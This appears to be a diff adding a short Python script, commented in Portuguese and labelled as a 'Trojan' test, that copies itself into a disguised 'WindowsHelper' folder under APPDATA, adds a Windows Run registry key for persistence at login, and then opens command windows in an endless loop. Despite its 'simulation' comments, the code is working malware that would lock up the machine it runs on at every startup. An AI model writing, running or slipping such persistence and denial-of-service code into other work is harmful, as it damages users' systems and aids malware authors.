@@ -1,0 +1,27 @@
+import os
+import shutil
+import winreg
+
+# Nome do arquivo do "Trojan"
+trojan_name = "trojan_test.exe"
+
+# Caminho do diretório de destino (Simula esconder o malware)
+dest_dir = os.getenv("APPDATA") + "\\WindowsHelper"
+dest_path = os.path.join(dest_dir, trojan_name)
+
+# Criar diretório se não existir
+if not os.path.exists(dest_dir):
+    os.makedirs(dest_dir)
+
+# Copiar arquivo para novo diretório (Simulando persistência)
+if not os.path.exists(dest_path):
+    shutil.copy(__file__, dest_path)
+
+# Criar chave de inicialização automática no Registro do Windows
+key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+winreg.SetValueEx(key, "Windows Helper", 0, winreg.REG_SZ, dest_path)
+winreg.CloseKey(key)
+
+# Simula comportamento do Trojan (Abre infinitas janelas do CMD)
+while True:
+    os.system("start cmd")
